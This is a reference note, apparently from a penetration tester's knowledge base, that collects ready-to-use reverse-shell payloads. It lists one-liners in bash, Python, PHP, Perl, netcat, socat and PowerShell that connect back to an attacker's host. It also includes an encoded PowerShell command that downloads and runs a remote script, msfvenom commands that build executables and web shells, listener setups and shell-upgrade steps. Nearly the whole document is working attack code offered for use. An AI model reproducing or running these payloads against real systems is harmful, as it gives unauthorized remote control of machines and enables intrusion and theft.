---
tags: [reference, reverse-shell, payloads, shells]
---

# Reverse Shells — Reference

> Full collection with PTY upgrade: [[00-Quick-Reference/Reverse-Shells]]

## Most Reliable One-Liners

```bash
# Bash TCP
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1

# Bash (urlencode-safe)
0<&196;exec 196<>/dev/tcp/<lhost>/<lport>; sh <&196 >&196 2>&196

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<lhost>",<lport>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("<lhost>",<lport>);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# Netcat with -e
nc -e /bin/bash <lhost> <lport>

# Netcat without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <lhost> <lport> > /tmp/f

# Socat (full TTY)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>
```

## Windows Reverse Shells

```powershell
# PowerShell (no restriction)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Encoded PowerShell
$Text = 'IEX(New-Object Net.WebClient).DownloadString("http://<lhost>/shell.ps1")'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$Enc = [Convert]::ToBase64String($Bytes)
powershell -enc $Enc
```

## msfvenom

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > shell.exe

# Windows EXE (meterpreter)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe > meter.exe

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw > shell.jsp

# ASPX
msfvenom -p windows/shell/reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx > shell.aspx

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war > shell.war
```

## Listeners

```bash
# Netcat
nc -lvnp <lport>

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <lhost>; set LPORT <lport>; run"

# Socat (full TTY listener)
socat file:`tty`,raw,echo=0 tcp-listen:<lport>
```

## Shell Upgrade → Full TTY

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then:
Ctrl+Z
stty raw -echo; fg
# Press Enter, then:
export TERM=xterm-256color
stty rows 50 cols 200

# Script PTY
script -q /dev/null -c /bin/bash
```

## Related

- [[00-Quick-Reference/Reverse-Shells]] — Full reverse shell collection
- [[05-Exploitation/Linux]] — Linux exploitation
- [[05-Exploitation/Windows]] — Windows exploitation
